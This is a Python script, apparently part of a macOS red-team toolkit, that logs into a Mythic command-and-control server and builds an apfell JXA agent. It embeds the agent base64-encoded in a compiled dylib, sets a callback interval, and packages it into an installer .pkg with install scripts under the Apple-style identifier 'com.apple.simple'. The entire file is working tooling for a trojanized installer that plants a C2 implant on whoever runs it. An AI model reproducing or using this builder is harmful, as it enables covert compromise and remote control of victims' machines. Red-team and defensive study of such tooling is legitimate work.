import os, base64
import asyncio
from .Utilities import *


def install_pkg_py():
    temp = "./Templates/JXADylib_Runner"
    payload = "./Payloads/Installer_Package_Dylib_Payload"

    copyanything(temp, payload)

    ## Create apfell payload
    async def scripting():
        print("[+] Logging into Mythic")
        mythic_instance = await login_mythic()
        print("[+] Creating new apfell payload")
        # define what our payload should be
        resp = await create_apfell_payload(mythic_instance=mythic_instance,
                                           description="Installer Pkg w/ Dylib",
                                           filename="Install_PKG_JXADylib.js",
                                           include_all_commands=True)
        if resp["build_phase"] == "success":
            # Download Payload
            payload_contents = await mythic.download_payload(mythic=mythic_instance, payload_uuid=resp["uuid"])
            pkg_payload = payload + "/Install_PKG_JXADylib.js"
            with open(pkg_payload, "wb") as f:
                f.write(payload_contents)  # write out to disk

            # Modify the runner
            templateString = "BASE64 ENCODED APFELL PAYLOAD HERE"
            fin = open(payload + "/Install_PKG_JXADylib.js", "rt")
            orgPayload = fin.read()
            fin.close()

            # base64 Payload
            message_bytes = orgPayload.encode('ascii')
            base64_bytes = base64.b64encode(message_bytes)
            base64_message = base64_bytes.decode('ascii')

            # print(base64_message)

            fin = open("./Payloads/Installer_Package_Dylib_Payload/JXADylib_Runner/JSRunner.mm", "rt")
            data = fin.read()
            data = data.replace(templateString, base64_message)
            fin.close()

            fin = open("./Payloads/Installer_Package_Dylib_Payload/JXADylib_Runner/JSRunner.mm", "wt")
            fin.write(data)
            fin.close()

            # Create dylib
            print("[*] Building JXA Dylib")
            os.system(
                "g++ -dynamiclib -o /private/tmp/helper.dylib -framework Foundation -framework OSAKit ./Payloads/Installer_Package_Dylib_Payload/JXADylib_Runner/plugin.cpp ./Payloads/Installer_Package_Dylib_Payload/JXADylib_Runner/jsrunner.mm")
            os.system(
                "mv /private/tmp/helper.dylib ./Payloads/Installer_Package_Dylib_Payload/simple-package/scripts/files/helper.dylib")

            # Modify callback time
            fin = open("./Payloads/Installer_Package_Dylib_Payload/simple-package/scripts/files/helper.py", "rt")
            data = fin.read()
            data = data.replace("callback_time", str(mythic_http_callback_interval))
            fin.close()
            fin = open("./Payloads/Installer_Package_Dylib_Payload/simple-package/scripts/files/helper.py", "wt")
            fin.write(data)
            fin.close()

            #  Build the payload (currently no payload)
            print("[*] Building Installer Package Payload")
            os.system("chmod +x ./Payloads/Installer_Package_Dylib_Payload/simple-package/scripts/preinstall")
            os.system("chmod +x ./Payloads/Installer_Package_Dylib_Payload/simple-package/scripts/postinstall")
            os.system(
                "pkgbuild --identifier com.apple.simple --nopayload --scripts ./Payloads/Installer_Package_Dylib_Payload/simple-package/scripts ./Payloads/Installer_Package_Dylib_Payload/simple_dylib.pkg")

            print("[+] Built simple_dylib.pkg")
            print("Notes: \n"
                  "1) This version saves the apfell payload dylib on target as /Library/Application Support/helper.dylib and the python file to execute it as helper.py \n"
                  "2) Modify the preinstall and postinstall scripts to change this behavior")
        else:
            print(f"[-] Failed to build payload: {resp['build_stderr']}\n{resp['build_message']}")

    async def main():
        await scripting()

    asyncio.run(main())
